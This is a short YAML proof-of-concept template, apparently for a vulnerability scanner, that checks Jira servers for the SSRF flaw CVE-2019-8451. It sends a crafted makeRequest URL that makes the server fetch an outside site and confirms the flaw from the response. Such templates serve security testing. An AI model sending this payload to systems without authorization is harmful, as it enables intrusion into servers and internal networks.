name: poc-yaml-jira-ssrf-cve-2019-8451
set:
  scheme: parseURL(url).scheme
  host: parseURL(url).host
rules:
  - method: GET
    path: >-
      /plugins/servlet/gadgets/makeRequest?url={{scheme}}://{{host}}@www.baidu.com
    headers:
      X-Atlassian-Token: no-check
    follow_redirects: true
    expression: |
      status == 200 && body.bcontains(b'BDORZ') && body.bcontains(b'domain=.baidu.com')
detail:
  author: jingling(https://github.com/shmilylty)
  links:
    - https://jira.atlassian.com/browse/JRASERVER-69793
    - https://dwz.cn/SWN9Vamc
